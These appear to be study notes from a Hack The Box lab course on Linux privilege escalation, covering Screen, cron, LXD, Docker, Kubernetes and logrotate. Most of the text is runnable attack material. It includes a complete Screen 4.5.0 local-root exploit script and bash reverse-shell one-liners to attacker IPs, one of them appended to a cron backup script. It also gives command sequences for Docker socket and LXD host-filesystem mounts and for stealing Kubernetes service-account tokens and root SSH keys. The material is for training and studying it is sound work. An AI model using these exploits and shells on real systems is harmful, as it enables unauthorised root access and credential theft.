# 🍑 Service-based Privilege Escalation

## Vulnerable Services

Many services may be found, which have flaws that can be leveraged to escalate privileges. An example is the popular terminal multiplexer [Screen](https://linux.die.net/man/1/screen). Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.

```shell-session
ElFelixi0@htb[/htb]$ screen -v

Screen version 4.05.00 (GNU) 10-Dec-16
```

This allows an attacker to truncate any file or create a file owned by root in any directory and ultimately gain full root access.

Here is the POC ->

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

## Cron Job Abuse

Cron jobs are  typically used for administrative tasks such as running backups, cleaning up directories, etc. The `crontab` command can create a cron file, which will be run by the cron daemon on the schedule specified

&#x20;the cron file will be created in `/var/spool/cron` for the specific user that creates it. Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. For example, the entry `0 */12 * * * /home/admin/backup.sh` would run every 12 hours.

Certain applications create cron files in the `/etc/cron.d` directory and may be misconfigured to allow a non-root user to edit them.

let's look around the system for any writeable files or directories

```shell-session
ElFelixi0@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control
<SNIP>
/home/backupsvc/backup.sh
<SNIP>
```

`backup.sh` in the `/dmz-backups` directory is interesting and seems like it could be running on a cron job.

and if we look at the `/dmz-backups` directory, it shows what appears to be files created every three minutes.

Perhaps the sysadmin meant to specify every three hours like `0 */3 * * *` but instead wrote `*/3 * * * *`

We can confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges

&#x20;`-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) every 1000ms

```shell-session
./pspy64 -pf -i 1000
```

So the output of this would indeed confirm this script is used in a cronjob, so we can try and modify it and appen a bash one liner reverse shell in it ->

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
#add this -> 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

and after running a netcat  listerner, we can wait for our reverse shell to hit&#x20;

## Containers

{% hint style="info" %}
Containers operate at the operating system level and virtual machines at the hardware level. Containers thus share an operating system and isolate application processes from the rest of the system, while classic virtualization allows multiple operating systems to run simultaneously on a single system.
{% endhint %}

Linux Containers (`LXC`) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them.

Linux Daemon ([LXD](https://github.com/lxc/lxd)) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container. Before we can use this service to escalate our privileges, we must be in either the `lxc` or `lxd` group. To check our group we can use the `id` command ->

```shell-session
uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

Now to abuse LXC or LXD We can either create our own container and transfer it to the target system or use an existing container. administrators often use templates that have little to no security that often don't have passwords ->

```shell-session
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz
```

To exploit this we need to import this container as an image.

```shell-session
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list
```

Then we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.

```shell-session
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

And now we can start the container and log into it. In the container, we can then go to the path we specified to access the `resource` of the host system as `root`.

```shell-session
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
#or
container-user@nix02:~$ lxc exec privesc /bin/sh
root@nix02:~# ls -l /mnt/root                    
```

## Docker

Docker is a popular open-source tool that provides a portable and consistent runtime environment for software applications. It uses containers as isolated environments in user space that run at the operating system level and share the file system and system resources.

the docker archit. has  two primary components:

* The Docker daemon
* The Docker client

The Docker client acts as our interface for issuing commands and interacting with the Docker ecosystem, while the Docker daemon is responsible for executing those commands and managing containers.

When we interact with Docker, we issue commands through the `Docker Client`, which communicates with the Docker Daemon (through a `RESTful API` or a `Unix socket`) and serves as our primary means of interacting with Docker.

#### Privesc (**Shared Directories)**

shared directories (volume mounts) can bridge the gap between the host system and the container's filesystem. With shared directories, specific directories or files on the host system can be made accessible within the container.

When we get access to the docker container and enumerate it locally, we might find additional (non-standard) directories on the docker’s filesystem.

```shell-session
root@container:~$ cd /hostsystem/home/cry0l1t3
drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh
root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa
```

From here on, we could copy the contents of the private SSH key to `cry0l1t3.priv` file and use it to log in as the user `cry0l1t3` on the host system.

#### Privesc (**Sockets)**

A Docker socket or Docker daemon socket is a special file that allows us and processes to communicate with the Docker daemon. This communication occurs either through a Unix socket or a network socket, depending on the configuration of our Docker setup.

When we issue a command through the Docker CLI, the Docker client sends the command to the Docker socket, and the Docker daemon, in turn, processes the command and carries out the requested actions.

```shell-session
htb-student@container:~/app$ ls -al
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```

From here on, we can use the `docker` to interact with the socket and enumerate what docker containers are already running. If not installed, then we can download it [here](https://master.dockerproject.org/linux/x86\_64/docker) and upload it to the Docker container.

```shell-session
htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
htb-student@container:/tmp$ chmod +x docker
htb-student@container:/tmp$ ls -l
-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker
htb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps
```

We can create our own Docker container that maps the host’s root directory (`/`) to the `/hostsystem` directory on the container and full access to the host system.

```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps
CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
```

&#x20;we can log in to the new privileged Docker container with the ID `7ae3bcc818af` and navigate to the `/hostsystem`.

```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa
```

#### Privesc (**Groups)**

To gain root privileges through Docker, the user we are logged in with must be in the `docker` group (`id` command to check). This allows him to use and control the Docker daemon.

Alternatively, Docker may have SUID set, or we are in the Sudoers file, which permits us to run `docker` as root.

To see which images exist and which we can access ->

```shell-session
docker-user@nix02:~$ docker image ls
```

#### Privesc (**Socket)**

A case that can also occur is when the Docker socket is writable. Usually, this socket is located in `/var/run/docker.sock`

If we act as a user, not in one of these two groups (root or docker group), and the Docker socket still has the privileges to be writable, then we can still use this case to escalate our privileges.

```shell-session
docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

_**Escalate the privileges on the target and obtain the flag.txt in the root directory. Submit the contents as the answer.**_

<figure><img src="../../../.gitbook/assets/image (1476).png" alt=""><figcaption></figcaption></figure>

## Kubernetes

[Kubernetes](https://kubernetes.io/), also known as `K8s` transformed the process of deploying and managing applications, providing a more efficient and streamlined approach. Offering an open-source architecture, Kubernetes has been specifically designed to facilitate faster and more straightforward deployment, scaling, and management of application containers.

It is a container orchestration system, which functions by running all applications in containers isolated from the host system through `multiple layers of protection`. This approach ensures that applications are not affected by changes in the host system, such as updates or security patches

Kubernetes revolves around the concept of **pods**, which can hold one or more closely connected containers. **Each pod functions as a separate virtual machine on a node, complete with its own IP, hostname, and other details.**

The core of Kubernetes architecture is its API, which serves as the main point of contact for all internal and external interactions.

By default, **the Kubelet allows anonymous access.** Anonymous requests are considered unauthenticated, which implies that any request made to the Kubelet without a valid client certificate will be treated as anonymous.

**interacting with K8's API ->**

```shell-session
cry0l1t3@k8:~$ curl https://10.129.10.11:6443 -k
{
	"kind": "Status",
	"apiVersion": "v1",
	"metadata": {},
	"status": "Failure",
	"message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
	"reason": "Forbidden",
	"details": {},
	"code": 403
}
```

`System:anonymous` typically represents an unauthenticated user, meaning we haven't provided valid credentials or are trying to access the API server anonymously. In this case, we try to access the root path, which would grant significant control over the Kubernetes cluster if successful.

**If we want to extract pods ->**

```shell-session
cry0l1t3@k8:~$ curl https://10.129.10.11:10250/pods -k | jq .
```

This could contain confidential details regarding the container images and their pull policies.

**Kubeletctl - Extracting Pods**

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 pods
```

and to show the available commands ->

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 scan rce
```

We can alos try to engage with a container interactively and gain insight into the extent of our privileges within it ->

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
```

#### Privesc

&#x20;we can utilize a tool called [kubeletctl](https://github.com/cyberark/kubeletctl) to obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server.

To extract tokens ->

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```

To extract certificates->

```shell-session
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

Now that we have both the `token` and `certificate`, we can check the access rights in the Kubernetes cluster.

```shell-session
cry0l1t3@k8:~$ export token=`cat k8.token`
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```

If in the output we see that we can `get`, `create`, and `list` pods which are the resources representing the running container in the cluster, we can create a `YAML` file that we can use to create a new container and mount the entire root filesystem from the host system into this container's `/root` directory ->

```
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Now we can create the pod ->

```shell-session
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
```

If the pod is running we can execute the command and we could spawn a reverse shell or retrieve sensitive data like private SSH key from the root user.

```shell-session
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

## Logrotate

To prevent the hard disk from overflowing, a tool called `logrotate` takes care of archiving or disposing of old logs.

To get more information on logrotate ->

```shell-session
ElFelixi0@htb[/htb]$ man logrotate
ElFelixi0@htb[/htb]$ # or
ElFelixi0@htb[/htb]$ logrotate --help
```

This tool is usually started periodically via `cron` and controlled via the configuration file `/etc/logrotate.conf`

<details>

<summary>logrotate.conf example</summary>

```shell-session
ElFelixi0@htb[/htb]$ cat /etc/logrotate.conf


# see "man logrotate" for details

# global options do not affect preceding include directives

# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may also be configured here.
```

</details>

To exploit `logrotate`, we need some requirements that we have to fulfill ->

1. we need `write` permissions on the log files
2. logrotate must run as a privileged user or `root`
3. vulnerable versions:
   * 3.8.6
   * 3.11.0
   * 3.15.0
   * 3.18.0

A good tool to  exploit this is named [logrotten](https://github.com/whotwagner/logrotten).

```shell-session
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten
```

Now we need a payload to be executed

```shell-session
logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

Then we we need to determine which option `logrotate` uses in `logrotate.conf`
